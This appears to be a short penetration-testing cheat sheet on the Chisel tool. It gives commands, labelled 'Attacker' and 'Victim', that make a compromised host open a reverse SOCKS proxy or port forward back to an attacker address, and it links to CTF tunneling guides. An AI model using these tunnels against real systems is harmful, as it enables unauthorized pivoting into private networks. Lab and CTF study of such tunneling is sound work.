# Chisel

## Socks

```
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

## Port Forwarding

```
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## Links

{% embed url="https://dev.to/jmau111/getting-started-with-chisel-in-ctfs-o76/" %}

{% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}

{% embed url="https://goteleport.com/blog/ssh-tunneling-explained/" %}
